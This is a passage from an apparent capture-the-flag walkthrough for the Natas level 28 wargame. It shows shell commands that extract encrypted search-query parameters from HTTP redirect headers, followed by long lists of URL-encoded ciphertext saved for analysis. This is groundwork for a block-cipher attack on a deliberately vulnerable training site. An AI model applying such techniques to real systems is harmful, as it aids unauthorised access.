+54:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxyStGL%2Bz4hLVDH22489jWQowAQcCYxLrNxe2TV1ZOUQXdfmTQ3MhoJTaSrfy9N5bRv4o%3D
+55:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySuOWcfMb3pCOSdItTABThJfZIaVSupG%2B5Ppq4WEW09L0Nf%2FK3JUU%2FwpRwHlH118D44%3D
+56:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySuFgWtD6TIkf2l2tkOwGMpXiW3pCIT4YQixZ%2Fi0rqXXY5FyMgUUg%2BaORY%2FQZhZ7MKM%3D
+57:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySv1YFQkdMmwYDG1%2FaNvaHrPoJUi8wHPnTascCPxZZSMWpc5zZBSL6eob5V3O1b5%2BMA%3D
+58:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySv2M%2BawX4ZiJrhjgXESsckrc4pf%2B0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI%3D
+59:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySv2M%2BawX4ZiJrhjgXESsckrNjNpR93%2FBz0TLCI5HmVRCMqM9OYQkTq645oGdhkgSlo%3D
+60:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySv2M%2BawX4ZiJrhjgXESsckrh1J9Q3czmMbvHxFKUToAKHX9UET9Bj0m9rt%2Fc0tByJk%3D
+
+*CUT PARAMETERS ONLY | FIELD NUMBER 2*
+
+┌──(ra6narok㉿kali)-[~/Desktop/Natas/natas28]
+└─$ grep -a Location * | cut -d "=" -f 2
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJigpJxv9DL2tFeWhn127rDiW3pCIT4YQixZ%2Fi0rqXXY5FyMgUUg%2BaORY%2FQZhZ7MKM%3D 
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKjd8MKDZZIiKG51FNeoPjUvfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKYsNYgsg1hFJebd%2BJNix06SHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJ8EmoxKU1njKubmw7%2BRDt1mi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPK02918sQNUadassvlSAHDHKSh%2FPMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJLk0xdEarIh%2BMvTkV61TlvrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ%2FOns%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJ%2BDZedSJQqwrZX9tfUGM7WQcCYxLrNxe2TV1ZOUQXdfmTQ3MhoJTaSrfy9N5bRv4o%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKvwmKMYUAmbbaAruK1epuIZIaVSupG%2B5Ppq4WEW09L0Nf%2FK3JUU%2FwpRwHlH118D44%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLNQ6RxZsY7UPRe5yiycfUiiW3pCIT4YQixZ%2Fi0rqXXY5FyMgUUg%2BaORY%2FQZhZ7MKM%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKIFsYeK8Y3JmD4ecRfI3d%2BoJUi8wHPnTascCPxZZSMWpc5zZBSL6eob5V3O1b5%2BMA%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyc4pf%2B0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyNjNpR93%2FBz0TLCI5HmVRCMqM9OYQkTq645oGdhkgSlo%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyh1J9Q3czmMbvHxFKUToAKHX9UET9Bj0m9rt%2Fc0tByJk%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyxkduQZYZ04f0V3MSJfFf4WIjoU2cQpG5h3WwP7xz1O3YrlHX2nGysIPZGaDXuIuY
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy8E3OxOtrwX6aLupZE7rN8kJXo0PararywOOh1xzgPdF7e6ymVfKYoyHpDj96YNTY
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyBCVa4WFY0V3lE8rdLRyW4qdz8xhQlKoBQI8fl9A304VnjFdz7MKPhw5PTrxsgHCk
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy4982HGOTYZrHs%2BnQl7ERrqd%2BjtGqvgtdBcT%2F5qwUI6tHjrGh%2FiYaLGwVBhEJs%2F7a
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyzWmcbPL7fl9D3iEG3blOYr36EFTsaFFc%2BW8qVURZGUeQT0sqvywtdoaqcqUxUclw
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyp7SJW%2Ff7tx3AmzQXc4%2FWeEh5mgex0ptZggFck1XC4A6t7ZvbrKanO3GzWgENLExX
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyhwCRNj7%2FkSX2mM0u1Qv9KJouK1228x8ZoU91Z46tqpBCSbk%2BTeoJCUeZlbnESzUa
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy5wrwtg4yc%2FS3kXfVkDZZTCkofzzFR54S5m8xyGOxgEdW1XMtyMdw9kOXFYvBem5m
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyzjyIMCFvQOsVmZpQmxtr8qw7hxwcRIOGtFzTbZ6PcvRlUUm7uiEj2J2VQX6ifzp7
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyRi%2Fs%2BIS1Qx9tuPPY1kKMAEHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b%2BK
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyjlnHzG96QjknSLUwAU4SX2SGlUrqRvuT6auFhFtPS9DX%2FytyVFP8KUcB5R9dfA%2BO
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyhYFrQ%2BkyJH9pdrZDsBjKV4lt6QiE%2BGEIsWf4tK6l12ORcjIFFIPmjkWP0GYWezCj
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9WBUJHTJsGAxtf2jb2h6z6CVIvMBz502rHAj8WWUjFqXOc2QUi%2BnqG%2BVdztW%2BfjA
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK3OKX%2FtKRQAkZ3UXWuWWu9bzTfM5xp7c4R9mULvO1icC
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJKzYzaUfd%2Fwc9EywiOR5lUQjKjPTmEJE6uuOaBnYZIEpa
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK4dSfUN3M5jG7x8RSlE6ACh1%2FVBE%2FQY9Jva7f3NLQciZ
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK8ZHbkGWGdOH9FdzEiXxX%2BFiI6FNnEKRuYd1sD%2B8c9Tt2K5R19pxsrCD2Rmg17iLmA%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FBNzsTra8F%2Bmi7qWRO6zfJCV6ND2q2q8sDjodcc4D3Re3usplXymKMh6Q4%2FemDU2A%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJKwQlWuFhWNFd5RPK3S0cluKnc%2FMYUJSqAUCPH5fQN9OFZ4xXc%2BzCj4cOT068bIBwpA%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2BPfNhxjk2Gax7Pp0JexEa6nfo7Rqr4LXQXE%2F%2BasFCOrR46xof4mGixsFQYRCbP%2B2g%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK81pnGzy%2B35fQ94hBt25TmK9%2BhBU7GhRXPlvKlVEWRlHkE9LKr8sLXaGqnKlMVHJcA%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK6e0iVv3%2B7cdwJs0F3OP1nhIeZoHsdKbWYIBXJNVwuAOre2b26ympztxs1oBDSxMVw%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK4cAkTY%2B%2F5El9pjNLtUL%2FSiaLitdtvMfGaFPdWeOraqQQkm5Pk3qCQlHmZW5xEs1Gg%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2BcK8LYOMnP0t5F31ZA2WUwpKH88xUeeEuZvMchjsYBHVtVzLcjHcPZDlxWLwXpuZg%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK848iDAhb0DrFZmaUJsba%2FKsO4ccHESDhrRc022ej3L0ZVFJu7ohI9idlUF%2Bon86ew%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK0Yv7PiEtUMfbbjz2NZCjABBwJjEus3F7ZNXVk5RBd1%2BZNDcyGglNpKt%2FL03ltG%2Fig%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK45Zx8xvekI5J0i1MAFOEl9khpVK6kb7k%2BmrhYRbT0vQ1%2F8rclRT%2FClHAeUfXXwPjg%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK4WBa0PpMiR%2FaXa2Q7AYyleJbekIhPhhCLFn%2BLSupddjkXIyBRSD5o5Fj9BmFnswow%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FVgVCR0ybBgMbX9o29oes%2BglSLzAc%2BdNqxwI%2FFllIxalznNkFIvp6hvlXc7Vvn4wA%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxyStzil%2F7SkUAJGd1F1rllrvW803zOcae3OEfZlC7ztYnAg%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySs2M2lH3f8HPRMsIjkeZVEIyoz05hCROrrjmgZ2GSBKWg%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySuHUn1DdzOYxu8fEUpROgAodf1QRP0GPSb2u39zS0HImQ%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySvGR25BlhnTh%2FRXcxIl8V%2FhYiOhTZxCkbmHdbA%2FvHPU7diuUdfacbKwg9kZoNe4i5g%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySvwTc7E62vBfpou6lkTus3yQlejQ9qtqvLA46HXHOA90Xt7rKZV8pijIekOP3pg1Ng%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySsEJVrhYVjRXeUTyt0tHJbip3PzGFCUqgFAjx%2BX0DfThWeMV3Pswo%2BHDk9OvGyAcKQ%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySvj3zYcY5Nhmsez6dCXsRGup36O0aq%2BC10FxP%2FmrBQjq0eOsaH%2BJhosbBUGEQmz%2Fto%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySvNaZxs8vt%2BX0PeIQbduU5ivfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySuntIlb9%2Fu3HcCbNBdzj9Z4SHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySuHAJE2Pv%2BRJfaYzS7VC%2F0omi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySvnCvC2DjJz9LeRd9WQNllMKSh%2FPMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySvOPIgwIW9A6xWZmlCbG2vyrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ%2FOns%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxyStGL%2Bz4hLVDH22489jWQowAQcCYxLrNxe2TV1ZOUQXdfmTQ3MhoJTaSrfy9N5bRv4o%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySuOWcfMb3pCOSdItTABThJfZIaVSupG%2B5Ppq4WEW09L0Nf%2FK3JUU%2FwpRwHlH118D44%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySuFgWtD6TIkf2l2tkOwGMpXiW3pCIT4YQixZ%2Fi0rqXXY5FyMgUUg%2BaORY%2FQZhZ7MKM%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySv1YFQkdMmwYDG1%2FaNvaHrPoJUi8wHPnTascCPxZZSMWpc5zZBSL6eob5V3O1b5%2BMA%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySv2M%2BawX4ZiJrhjgXESsckrc4pf%2B0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySv2M%2BawX4ZiJrhjgXESsckrNjNpR93%2FBz0TLCI5HmVRCMqM9OYQkTq645oGdhkgSlo%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySv2M%2BawX4ZiJrhjgXESsckrh1J9Q3czmMbvHxFKUToAKHX9UET9Bj0m9rt%2Fc0tByJk%3D
+
+*SAVE OUTPUT TO A FILE.TXT*
+
+┌──(ra6narok㉿kali)-[~/Desktop/Natas/natas28]
+└─$ grep -a Location * | cut -d "=" -f 2 > file.txt
+
+*TOGGLE TEXT EDITOR*
+*OPEN FILE.TXT*
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJigpJxv9DL2tFeWhn127rDiW3pCIT4YQixZ%2Fi0rqXXY5FyMgUUg%2BaORY%2FQZhZ7MKM%3D <----------DEFAULT = COMPUTER - DELETE
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKjd8MKDZZIiKG51FNeoPjUvfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKYsNYgsg1hFJebd%2BJNix06SHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJ8EmoxKU1njKubmw7%2BRDt1mi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPK02918sQNUadassvlSAHDHKSh%2FPMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJLk0xdEarIh%2BMvTkV61TlvrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ%2FOns%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJ%2BDZedSJQqwrZX9tfUGM7WQcCYxLrNxe2TV1ZOUQXdfmTQ3MhoJTaSrfy9N5bRv4o%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKvwmKMYUAmbbaAruK1epuIZIaVSupG%2B5Ppq4WEW09L0Nf%2FK3JUU%2FwpRwHlH118D44%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLNQ6RxZsY7UPRe5yiycfUiiW3pCIT4YQixZ%2Fi0rqXXY5FyMgUUg%2BaORY%2FQZhZ7MKM%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKIFsYeK8Y3JmD4ecRfI3d%2BoJUi8wHPnTascCPxZZSMWpc5zZBSL6eob5V3O1b5%2BMA%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyc4pf%2B0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyNjNpR93%2FBz0TLCI5HmVRCMqM9OYQkTq645oGdhkgSlo%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyh1J9Q3czmMbvHxFKUToAKHX9UET9Bj0m9rt%2Fc0tByJk%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyxkduQZYZ04f0V3MSJfFf4WIjoU2cQpG5h3WwP7xz1O3YrlHX2nGysIPZGaDXuIuY
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy8E3OxOtrwX6aLupZE7rN8kJXo0PararywOOh1xzgPdF7e6ymVfKYoyHpDj96YNTY
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyBCVa4WFY0V3lE8rdLRyW4qdz8xhQlKoBQI8fl9A304VnjFdz7MKPhw5PTrxsgHCk
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy4982HGOTYZrHs%2BnQl7ERrqd%2BjtGqvgtdBcT%2F5qwUI6tHjrGh%2FiYaLGwVBhEJs%2F7a
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyzWmcbPL7fl9D3iEG3blOYr36EFTsaFFc%2BW8qVURZGUeQT0sqvywtdoaqcqUxUclw
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyp7SJW%2Ff7tx3AmzQXc4%2FWeEh5mgex0ptZggFck1XC4A6t7ZvbrKanO3GzWgENLExX
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyhwCRNj7%2FkSX2mM0u1Qv9KJouK1228x8ZoU91Z46tqpBCSbk%2BTeoJCUeZlbnESzUa
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy5wrwtg4yc%2FS3kXfVkDZZTCkofzzFR54S5m8xyGOxgEdW1XMtyMdw9kOXFYvBem5m
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyzjyIMCFvQOsVmZpQmxtr8qw7hxwcRIOGtFzTbZ6PcvRlUUm7uiEj2J2VQX6ifzp7
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyRi%2Fs%2BIS1Qx9tuPPY1kKMAEHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b%2BK
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyjlnHzG96QjknSLUwAU4SX2SGlUrqRvuT6auFhFtPS9DX%2FytyVFP8KUcB5R9dfA%2BO
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyhYFrQ%2BkyJH9pdrZDsBjKV4lt6QiE%2BGEIsWf4tK6l12ORcjIFFIPmjkWP0GYWezCj
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9WBUJHTJsGAxtf2jb2h6z6CVIvMBz502rHAj8WWUjFqXOc2QUi%2BnqG%2BVdztW%2BfjA
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK3OKX%2FtKRQAkZ3UXWuWWu9bzTfM5xp7c4R9mULvO1icC
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJKzYzaUfd%2Fwc9EywiOR5lUQjKjPTmEJE6uuOaBnYZIEpa
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK4dSfUN3M5jG7x8RSlE6ACh1%2FVBE%2FQY9Jva7f3NLQciZ
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK8ZHbkGWGdOH9FdzEiXxX%2BFiI6FNnEKRuYd1sD%2B8c9Tt2K5R19pxsrCD2Rmg17iLmA%3D%3D
